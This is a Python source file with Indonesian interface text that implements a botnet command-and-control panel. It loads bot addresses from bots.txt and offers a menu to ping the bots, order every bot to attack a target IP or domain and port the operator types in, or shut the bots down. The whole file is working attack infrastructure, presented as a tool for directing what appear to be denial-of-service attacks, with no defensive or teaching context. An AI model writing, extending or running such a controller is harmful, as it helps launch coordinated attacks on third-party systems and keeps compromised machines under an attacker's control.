# c2panel.py
import requests
from colorama import Fore
import os

def run_c2panel():
    if not os.path.exists("bots.txt"):
        print(Fore.RED + "[X] File bots.txt tidak ditemukan. Jalankan bot join terlebih dulu.")
        return

    with open("bots.txt", "r") as f:
        bots = [line.strip().replace("http://", "").replace(":80", "") for line in f.readlines() if line.strip()]

    if not bots:
        print(Fore.RED + "[X] Tidak ada bot aktif di bots.txt.")
        return

    while True:
        print(Fore.YELLOW + "\n[CONTROL PANEL] Kirim perintah ke semua bot:\n")
        print(Fore.CYAN + "[1] Cek Status Bot (Ping)")
        print(Fore.CYAN + "[2] Jalankan Attack Test")
        print(Fore.CYAN + "[3] Bersihkan Bot (Shutdown Endpoint)")
        print(Fore.CYAN + "[0] Kembali\n")

        opsi = input("Pilih perintah: ")

        if opsi == "1":
            for bot in bots:
                try:
                    r = requests.get(f"http://{bot}/ping", timeout=3)
                    if "pong" in r.text.lower():
                        print(Fore.GREEN + f"[✓] Bot {bot} responsif")
                    else:
                        print(Fore.MAGENTA + f"[!] Bot {bot} tidak valid")
                except:
                    print(Fore.RED + f"[X] Gagal ping {bot}")

        elif opsi == "2":
            target = input("Target IP/Domain: ")
            port = input("Target Port: ")

            for bot in bots:
                try:
                    url = f"http://{bot}/attack?target={target}&port={port}"
                    r = requests.get(url, timeout=5)
                    print(Fore.GREEN + f"[C2] Perintah dikirim ke {bot}: {r.status_code}")
                except:
                    print(Fore.RED + f"[X] Gagal mengirim ke {bot}")

        elif opsi == "3":
            for bot in bots:
                try:
                    r = requests.get(f"http://{bot}/shutdown", timeout=3)
                    print(Fore.YELLOW + f"[!] Shutdown dikirim ke {bot}: {r.status_code}")
                except:
                    print(Fore.RED + f"[X] Gagal shutdown {bot}")

        elif opsi == "0":
            print(Fore.CYAN + "[•] Kembali ke menu utama...")
            break

        else:
            print(Fore.RED + "[!] Pilihan tidak valid!")
